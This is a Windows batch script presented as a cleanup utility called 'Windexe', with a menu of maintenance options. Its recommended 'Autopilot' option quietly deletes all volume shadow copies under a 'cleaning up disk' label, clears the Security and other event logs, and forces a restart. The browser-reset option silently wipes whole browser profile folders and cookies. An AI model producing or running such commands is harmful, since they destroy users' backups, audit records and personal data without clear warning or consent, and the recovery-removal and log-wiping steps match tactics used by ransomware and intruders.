@ECHO OFF

Title WINDEXE - WINDOWS CLEANUP TOOLS 

Color 1F

:Menu 

CLS

echo.
echo COMPUTERNAME: %COMPUTERNAME%
echo USERNAME: %USERNAME%
echo DATE: %DATE%
echo TIME: %TIME%
echo.
echo SELECT A TOOL
echo =============
echo.
echo [R] README
echo.
echo [1] AUTOPILOT (RECOMMENDED)
echo [2] DELETE TEMPORARY FILES
echo [3] CLEAR EVENT VIEWER LOGS
echo [4] OPTIMIZE MEMORY USAGE
echo [5] REPAIR INTERNET CONNECTION
echo [6] DEFRAGMENT HARD DRIVE
echo [7] RESET INTERNET BROWSERS
echo [8] SYSTEM FILE CHECKER 
echo [x] EXIT
echo.

SET /P OP=RUN:

if %OP%==r goto README
if %OP%==R goto README
if %OP%==1 goto 1
if %OP%==2 goto 2
if %OP%==3 goto 3
if %OP%==4 goto 4
if %OP%==5 goto 5
if %OP%==6 goto 6
if %OP%==7 goto 7
if %OP%==8 goto 8
if %OP%==9 goto 9
if %OP%==x goto EXIT
if %OP%==X goto EXIT

--------------------------------------------------                        >nul 2>nul

:1

CLS

echo -------------------------------------------------------------------------------
echo [1] AUTOPILOT (RECOMMENDED)
echo -------------------------------------------------------------------------------
echo.
echo [%TIME%] DELETING TEMPORARY FILES. 

TASKKILL /F /IM explorer.exe                                              >nul 2>nul
TASKKILL /F /IM chrome.exe                                                >nul 2>nul
TASKKILL /F /IM firefox.exe                                               >nul 2>nul
TASKKILL /F /IM iexplore.exe                                              >nul 2>nul
TASKKILL /F /IM opera.exe                                                 >nul 2>nul
TASKKILL /F /IM safari.exe                                                >nul 2>nul 

DEL /F /S /Q "%TEMP%\*.*"                                                 >nul 2>nul
DEL /F /S /Q "%SYSTEMROOT%\*.tmp"                                         >nul 2>nul
DEL /F /S /Q "%SYSTEMROOT%\Prefetch\*.*"                                  >nul 2>nul

--------------------------------------------------                        >nul 2>nul

echo [%TIME%] CLEANING UP DISK.

CLEANMGR /SAGERUN:1                                                       >nul 2>nul

VSSADMIN DELETE SHADOWS /FOR=C: /ALL QUIET                                >nul 2>nul

--------------------------------------------------                        >nul 2>nul

echo [%TIME%] RESETTING NETWORK SETTINGS.

ROUTE -F                                                                  >nul 2>nul 
IPCONFIG /RELEASE                                                         >nul 2>nul 
IPCONFIG /RENEW                                                           >nul 2>nul 
IPCONFIG /FLUSHDNS                                                        >nul 2>nul 
NETSH INT IPV4 RESET ALL                                                  >nul 2>nul  
NETSH INT IPV6 RESET ALL                                                  >nul 2>nul 
NETSH INT HTTPSTUNNEL RESET ALL                                           >nul 2>nul  
NETSH INT PORTPROXY RESET ALL                                             >nul 2>nul  
NETSH INT TCP RESET ALL                                                   >nul 2>nul 
NETSH INT IP DELETE ARPCACHE                                              >nul 2>nul 
NETSH WINSOCK RESET ALL                                                   >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

echo [%TIME%] CLEARING EVENT VIEWER LOGS.  

WMIC NTEVENTLOG where filename='logfilename' CLEAREVENTLOG                >nul 2>nul  
WMIC NTEVENTLOG where filename='application' CLEAREVENTLOG                >nul 2>nul 
WMIC NTEVENTLOG where filename='system' CLEAREVENTLOG                     >nul 2>nul  
WMIC NTEVENTLOG where filename='security' CLEAREVENTLOG                   >nul 2>nul 

echo.
echo.
echo [%TIME%] COMPLETE!
echo.
echo Press any key to RESTART your computer . . . 
PAUSE >nul 

CLS

SHUTDOWN /R /F /T 1 

EXIT 

--------------------------------------------------                        >nul 2>nul 

:2

CLS

echo -------------------------------------------------------------------------------
echo [2] DELETE TEMPORARY FILES
echo -------------------------------------------------------------------------------
echo.
echo [%TIME%] DELETING TEMPORARY FILES - please wait.
  
TASKKILL /F /IM explorer.exe                                              >nul 2>nul
TASKKILL /F /IM chrome.exe                                                >nul 2>nul
TASKKILL /F /IM firefox.exe                                               >nul 2>nul
TASKKILL /F /IM iexplore.exe                                              >nul 2>nul
TASKKILL /F /IM opera.exe                                                 >nul 2>nul
TASKKILL /F /IM safari.exe                                                >nul 2>nul

--------------------------------------------------                        >nul 2>nul  

DEL /F /S /Q "%TEMP%\*.*"                                                 >nul 2>nul
DEL /F /S /Q "%SYSTEMROOT%\*.tmp"                                         >nul 2>nul
DEL /F /S /Q "%SYSTEMROOT%\Prefetch\*.*"                                  >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

CD /D %LOCALAPPDATA%                                                      >nul 2>nul
DEL /F /S /Q IconCache.db                                                 >nul 2>nul
START explorer.exe                                                        >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

echo.
echo.
echo [%TIME%] COMPLETE!
echo.
echo Press any key to return to the Menu . . . 
PAUSE >nul 
goto Menu

--------------------------------------------------                        >nul 2>nul 

:3

CLS

echo -------------------------------------------------------------------------------
echo [3] CLEAR EVENT VIEWER LOGS
echo -------------------------------------------------------------------------------
echo.
echo [%TIME%] CLEARING EVENT VIEWER LOGS - please wait.  

WMIC NTEVENTLOG where filename='logfilename' CLEAREVENTLOG                >nul 2>nul   
WMIC NTEVENTLOG where filename='application' CLEAREVENTLOG                >nul 2>nul  
WMIC NTEVENTLOG where filename='system' CLEAREVENTLOG                     >nul 2>nul  
WMIC NTEVENTLOG where filename='security' CLEAREVENTLOG                   >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

echo.
echo.
echo [%TIME%] COMPLETE!
echo.
echo Press any key to return to the Menu . . . 
PAUSE >nul 
goto Menu

--------------------------------------------------                        >nul 2>nul 

:4

CLS

echo -------------------------------------------------------------------------------
echo [4] OPTIMIZE MEMORY USAGE
echo -------------------------------------------------------------------------------
echo.
echo [%TIME%] OPTIMIZING MEMORY USAGE - please wait.

TASKKILL /F /IM explorer.exe                                              >nul 2>nul

%WINDIR%\system32\rundll32.exe advapi32.dll,ProcessIdleTasks              >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

CD /D %LOCALAPPDATA%                                                      >nul 2>nul
DEL /F /S /Q IconCache.db                                                 >nul 2>nul
START explorer.exe                                                        >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

echo.
echo.
echo [%TIME%] COMPLETE!
echo.
echo Press any key to return to the Menu . . . 
PAUSE >nul 
goto Menu

--------------------------------------------------                        >nul 2>nul 

:5

CLS

echo -------------------------------------------------------------------------------
echo [5] REPAIR INTERNET CONNECTION
echo -------------------------------------------------------------------------------
echo.
echo [%TIME%] REPAIRING INTERNET CONNECTION - please wait.

TASKKILL /F /IM explorer.exe                                              >nul 2>nul

ROUTE -F                                                                  >nul 2>nul  
IPCONFIG /RELEASE                                                         >nul 2>nul  
IPCONFIG /RENEW                                                           >nul 2>nul 
IPCONFIG /FLUSHDNS                                                        >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

CD /D %LOCALAPPDATA%                                                      >nul 2>nul
DEL /F /S /Q IconCache.db                                                 >nul 2>nul
START explorer.exe                                                        >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

echo.
echo.
echo [%TIME%] COMPLETE!
echo.
echo Press any key to return to the Menu . . . 
PAUSE >nul 
goto Menu 

--------------------------------------------------                        >nul 2>nul 

:6

CLS

echo -------------------------------------------------------------------------------
echo [6] DEFRAGMENT HARD DRIVE
echo -------------------------------------------------------------------------------
echo.
echo [%TIME%] DEFRAGMENTING HARD DRIVE - please wait.
echo.

TASKKILL /F /IM explorer.exe                                              >nul 2>nul

DEFRAG C: /U

--------------------------------------------------                        >nul 2>nul 

CD /D %LOCALAPPDATA%                                                      >nul 2>nul
DEL /F /S /Q IconCache.db                                                 >nul 2>nul
START explorer.exe                                                        >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

echo.
echo.
echo [%TIME%] COMPLETE!
echo.
echo Press any key to return to the Menu . . . 
PAUSE >nul 
goto Menu 

--------------------------------------------------                        >nul 2>nul 

:7

CLS

echo -------------------------------------------------------------------------------
echo [7] RESET INTERNET BROWSERS
echo -------------------------------------------------------------------------------
echo.
echo [%TIME%] RESETTING INTERNET BROWSERS - please wait.
echo.
echo - Google Chrome

TASKKILL /F /IM explorer.exe                                              >nul 2>nul
TASKKILL /F /IM chrome.exe                                                >nul 2>nul
TASKKILL /F /IM firefox.exe                                               >nul 2>nul
TASKKILL /F /IM iexplore.exe                                              >nul 2>nul
TASKKILL /F /IM opera.exe                                                 >nul 2>nul
TASKKILL /F /IM safari.exe                                                >nul 2>nul 

DEL /F /S /Q "%LOCALAPPDATA%\Google\Chrome\User Data\*.*"                 >nul 2>nul 
DEL /F /S /Q "%LOCALAPPDATA%\Google\CrashReports\*.*"                     >nul 2>nul 
RMDIR /S /Q "%LOCALAPPDATA%\Google\Chrome\User Data"                      >nul 2>nul 
RMDIR /S /Q "%LOCALAPPDATA%\Google\CrashReports"                          >nul 2>nul 

--------------------------------------------------                        >nul 2>nul 

echo - Mozilla Firefox

DEL /F /S /Q "%LOCALAPPDATA%\Mozilla\Firefox\Profiles\*.*"                >nul 2>nul 
DEL /F /S /Q "%APPDATA%\Mozilla\Extensions\*.*"                           >nul 2>nul 
DEL /F /S /Q "%APPDATA%\Mozilla\Firefox\*.*"                              >nul 2>nul 
RMDIR /S /Q "%LOCALAPPDATA%\Mozilla\Firefox\Profiles"                     >nul 2>nul 
RMDIR /S /Q "%APPDATA%\Mozilla\Extensions"                                >nul 2>nul 
RMDIR /S /Q "%APPDATA%\Mozilla\Firefox"                                   >nul 2>nul 

--------------------------------------------------                        >nul 2>nul 

echo - Internet Explorer
 
DEL /F /S /Q "%LOCALAPPDATA%\Microsoft\Internet Explorer\*.*"             >nul 2>nul
DEL /F /S /Q "%LOCALAPPDATA%\Microsoft\Windows\History\*.*"               >nul 2>nul
DEL /F /S /Q "%LOCALAPPDATA%\Microsoft\Windows\Tempor~1\*.*"              >nul 2>nul
DEL /F /S /Q "%APPDATA%\Microsoft\Windows\Cookies\*.*"                    >nul 2>nul
RMDIR /S /Q "%LOCALAPPDATA%\Microsoft\Internet Explorer"                  >nul 2>nul
RMDIR /S /Q "%LOCALAPPDATA%\Microsoft\Windows\History"                    >nul 2>nul
RMDIR /S /Q "%LOCALAPPDATA%\Microsoft\Windows\Tempor~1"                   >nul 2>nul
RMDIR /S /Q "%APPDATA%\Microsoft\Windows\Cookies"                         >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

echo - Opera Stable

DEL /F /S /Q "%LOCALAPPDATA%\Opera Software\Opera Stable\*.*"             >nul 2>nul 
DEL /F /S /Q "%APPDATA%\Opera Software\Opera Stable\*.*"                  >nul 2>nul 
RMDIR /S /Q "%LOCALAPPDATA%\Opera Software\Opera Stable"                  >nul 2>nul 
RMDIR /S /Q "%APPDATA%\Opera Software\Opera Stable"                       >nul 2>nul 

--------------------------------------------------                        >nul 2>nul 

echo - Apple Safari

DEL /F /S /Q "%LOCALAPPDATA%\Apple Computer\Safari\*.*"                   >nul 2>nul 
DEL /F /S /Q "%APPDATA%\Apple Computer\Safari\*.*"                        >nul 2>nul 
DEL /F /S /Q "%APPDATA%\Apple Computer\Preferences\*.*"                   >nul 2>nul 
RMDIR /S /Q "%LOCALAPPDATA%\Apple Computer\Safari"                        >nul 2>nul 
RMDIR /S /Q "%APPDATA%\Apple Computer\Safari"                             >nul 2>nul 
RMDIR /S /Q "%APPDATA%\Apple Computer\Preferences"                        >nul 2>nul

--------------------------------------------------                        >nul 2>nul 

CD /D %LOCALAPPDATA%                                                      >nul 2>nul
DEL /F /S /Q IconCache.db                                                 >nul 2>nul
START explorer.exe                                                        >nul 2>nul 

--------------------------------------------------                        >nul 2>nul   

echo.
echo.
echo [%TIME%] COMPLETE!
echo.
echo Press any key to return to the Menu . . . 
PAUSE >nul 
goto Menu 

--------------------------------------------------                        >nul 2>nul 

:8

CLS

echo -------------------------------------------------------------------------------
echo [8] SYSTEM FILE CHECKER 
echo -------------------------------------------------------------------------------
echo.
echo [%TIME%] CHECKING SYSTEM INTEGRITY - please wait. 
echo.

TASKKILL /F /IM explorer.exe                                              >nul 2>nul

SFC /SCANNOW

--------------------------------------------------                        >nul 2>nul 

echo.
echo.
echo [%TIME%] COMPLETE!
echo.
echo Press any key to RESTART your computer . . . 
PAUSE >nul 

CLS

SHUTDOWN /R /F /T 1 

EXIT 


--------------------------------------------------                        >nul 2>nul 

:README

CLS

echo -------------------------------------------------------------------------------
echo [R] README
echo -------------------------------------------------------------------------------
echo.
echo Windexe is designed to work best with Windows 7 or later. Please make sure you
echo have saved all of your work before using these tools. To help ensure Windexe 
echo completes successfully, please close all programs and files to avoid data loss.
echo.

--------------------------------------------------                        >nul 2>nul   

echo.
echo.
echo.
echo Press any key to return to the Menu . . . 
PAUSE >nul 
goto Menu 
